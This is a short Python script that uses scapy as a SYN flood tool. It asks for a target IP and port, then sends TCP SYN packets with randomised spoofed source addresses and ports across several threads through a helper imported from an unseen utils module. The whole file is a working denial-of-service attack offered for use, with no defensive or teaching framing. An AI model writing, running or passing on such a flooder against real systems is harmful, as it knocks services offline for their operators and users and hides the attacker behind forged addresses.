from scapy.all import *
from scapy.layers.inet import IP, TCP
from utils import *


def syn_flood(dst_ip, dst_port, one_work_num):
    for i in range(one_work_num):
        # IPlayer
        srcIP = random_ip()
        IPlayer = IP(src=srcIP, dst=dst_ip)
        # TCPlayer
        srcPort = randomPort()
        TCPlayer = TCP(sport=srcPort, dport=int(dst_port), flags="S")
        # 发送包
        send_packet = IPlayer / TCPlayer
        send(send_packet)


if __name__ == '__main__':
    print("#" * 30)
    print("# Welcome to SYN Flood Tool  #")
    print("#" * 30)
    # 输入目标IP和端口
    dst_ip_test = input("Target IP : ")
    dst_port_test = input("Target PORT : ")
    start_attack(syn_flood, thread_num=10, one_work_num=10,dst_ip=dst_ip_test,dst_port=dst_port_test)
